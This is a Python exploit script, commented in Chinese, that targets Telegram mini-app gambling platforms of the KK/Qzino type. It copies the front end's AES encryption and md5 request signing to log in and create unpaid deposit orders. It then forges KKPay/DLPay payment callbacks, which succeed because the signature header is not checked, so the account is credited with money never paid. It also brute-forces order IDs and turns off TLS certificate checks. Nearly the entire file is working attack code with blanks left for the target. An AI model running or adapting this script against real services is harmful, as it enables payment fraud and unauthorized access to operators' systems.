#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TG 小程序博彩平台 API 客户端模板(KK/Qzino/kkzonghe 类)
=======================================================
复刻前端 le() 封装:AES-128-CBC(key+随机IV前置+URL-safe base64) + ksort+md5 签名
用途:登录拿 token、调任意 method、支付回调伪造(P0 无限充值链)骨架
用法:
  1. 填 DOMAIN / AES_KEY / SIGN_SALT / INIT_DATA(或 TOKEN)
  2. pip install pycryptodome
  3. python tg_miniapp_api_client.py
依赖:pycryptodome
"""
import base64, hashlib, json, os, re, sys, time, urllib.parse, urllib.request, ssl

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    sys.exit("[!] 缺少依赖: pip install pycryptodome")

# ======================== 配置 ========================
DOMAIN     = "https://TARGET/api.html"      # 前端 config.js 的 api.baseUrl(用 Console location.href 确认真实域名)
CB_DOMAIN  = "https://TARGET/api.php"       # 回调入口(direct 路由)
AES_KEY    = b"16-BYTE-KEY-HERE"            # 前端 JS 明文(key.substring(0,16))
SIGN_SALT  = "SALT-FROM-FRONTEND-JS"        # 前端 JS 明文
INIT_DATA  = ""                             # window.Telegram.WebApp.initData 原文(5分钟有效期!)
TOKEN      = ""                             # 已有 token 时填这里,跳过登录
PAY_TYPE   = "kkpay"                        # kkpay / dlpay(同款漏洞,header 名不同)
# ======================================================

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def aes_encrypt(data: str) -> str:
    """与前端 Mf()/后端 Aes128.php 一致:AES-128-CBC,随机IV前缀,URL-safe base64"""
    iv = os.urandom(16)
    ct = AES.new(AES_KEY, AES.MODE_CBC, iv).encrypt(pad(data.encode("utf-8"), 16))
    return base64.b64encode(iv + ct).decode().replace("+", "-").replace("/", "_").replace("=", ".")


def md5_hex(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def generate_sign(params: dict) -> str:
    """前端 Df():ksort → JSON.stringify(无空格,ensure_ascii=False) + SALT → md5"""
    obj = {k: params[k] for k in sorted(params.keys())}
    return md5_hex(json.dumps(obj, ensure_ascii=False, separators=(",", ":")) + SIGN_SALT)


def api_call(method: str, params: dict, timeout=30):
    """复刻前端 le():params+method → sign → AES → POST data=..."""
    params = dict(params)
    params["method"] = method
    params["sign"] = generate_sign(params)
    obj = {k: params[k] for k in sorted(params.keys())}
    enc = aes_encrypt(json.dumps(obj, ensure_ascii=False, separators=(",", ":")))
    body = "data=" + urllib.parse.quote(enc)
    req = urllib.request.Request(
        DOMAIN, data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "Mozilla/5.0", "language": "zh"},
        method="POST")
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return json.loads(r.read().decode())


def login(init_data: str) -> str:
    """TG initData → token(前端 btoa(initData) 后作为 initData 参数)"""
    r = api_call("login", {"initData": base64.b64encode(init_data.encode()).decode()})
    if r.get("code") == 1:
        return r["token"]
    print(f"[-] 登录失败: {r}\n    → 检查:①initData 是否超5分钟(auth_date) ②域名是否真实(Console location.href) ③bot是否匹配")
    return ""


def forge_callback(unique_id: str, txid: str, amount: str):
    """伪造 KKPay/DLPay 充值回调 — 签名头任意非空即可"""
    header_name = "Kkpay-Sign" if PAY_TYPE == "kkpay" else "Dali-Sign"
    body = json.dumps({
        "businessType": "deposit", "txid": txid, "payUser": "",
        "amount": amount, "currency": "usdt", "fee": "0", "userOrder": unique_id,
    }, ensure_ascii=False)
    req = urllib.request.Request(
        CB_DOMAIN + "?direct=" + PAY_TYPE,
        data=base64.b64encode(body.encode()),
        headers={"Content-Type": "text/plain", header_name: "x", "User-Agent": "Mozilla/5.0"},
        method="POST")
    with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
        out = r.read().decode()
        print(f"[+] 回调响应({r.status}): {out}")
        return out == "SUCCESS"


def extract_unique_id_from_paylink(paylink: str):
    """KKPay 支付链接通常携带 userOrder(即平台订单 unique_id)"""
    m = re.search(r"[?&](?:userOrder|orderId|order_no|orderid|trade_no)=([^&#]+)", paylink or "")
    if m:
        return urllib.parse.unquote(m.group(1))
    print(f"[*] paylink 未匹配订单参数,完整链接: {paylink}")
    return None


def brute_unique_id(member_id: int, created_ts: int, check, timeout_s=60):
    """兜底:unique_id = md5(member_id + created_ts + 6位随机);时间戳需精确(服务器时间±1s 内)"""
    t0 = time.time()
    for i in range(1000000):
        uid = md5_hex(f"{member_id}{created_ts}{i:06d}")
        if check(uid):
            return uid
        if time.time() - t0 > timeout_s:
            return None
    return None


def main():
    token = TOKEN or login(INIT_DATA)
    if not token:
        sys.exit(1)
    print(f"[+] token: {token[:24]}...")

    # 创建订单(不付钱)→ paylink
    r = api_call("deposit_" + PAY_TYPE, {"token": token, "amount": "1"})
    print(f"[+] 订单: code={r.get('code')} paylink={str(r.get('paylink'))[:80]}")
    uid = extract_unique_id_from_paylink(r.get("paylink", ""))
    if not uid:
        sys.exit("[!] 拿不到 unique_id,改用手动填 / 暴力(需 member_id+精确时间戳)")

    # 伪造回调 → bot 自动确认
    if forge_callback(uid, f"fake_{int(time.time()*1000)}", "1"):
        print("[+] 回调成功,等待 bot 确认(processPendingDeposits 无链上验证)...")
        for _ in range(60):
            time.sleep(2)
            mi = api_call("myinf", {"token": token}).get("myinf") or {}
            bal = mi.get("balance")
            print(f"    余额: {bal}")
            try:
                if float(str(bal).replace(",", "")) >= 1.0:
                    print("[+] ★ 到账确认,漏洞链完整!")
                    return
            except (TypeError, ValueError):
                pass
        print("[-] 120s 未见到账,检查 bot 进程/订单状态")


if __name__ == "__main__":
    main()
